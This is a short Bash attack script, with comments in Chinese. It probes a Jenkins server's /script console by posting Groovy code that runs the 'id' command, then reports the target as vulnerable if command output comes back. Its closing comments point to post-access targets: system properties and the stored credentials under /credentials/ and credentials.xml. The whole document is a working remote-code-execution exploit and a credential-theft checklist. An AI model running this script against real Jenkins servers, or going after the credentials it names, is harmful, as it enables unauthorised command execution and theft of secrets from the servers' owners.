#!/usr/bin/env bash
TARGET="${1:?usage: bash jenkins.sh http://TARGET:8080 [user:pass]}"
AUTH="${2:-}"
B="${TARGET%/}"
# 只有写成 user:pass 才加 -u；否则 curl 会交互式等密码，脚本就挂住了
AUTH_ARGS=()
case "$AUTH" in *:*) AUTH_ARGS=(-u "$AUTH") ;; esac
out=$(curl -sS -m 15 -X POST "$B/script" "${AUTH_ARGS[@]}" \
  --data-urlencode 'script=println "id".execute().text' </dev/null 2>/dev/null)
printf '%s' "$out" | grep -qE 'uid=[0-9]+' && { echo "VULN  $TARGET"; printf '%s\n' "$out" | head -8; exit 0; }
echo "SAFE/需登录  $TARGET"
# 拿到权限后的高价值目标：
#   /script → println Jenkins.instance.getComputer().getSystemProperties()
#   凭据：/credentials/ 与 $JENKINS_HOME/credentials.xml
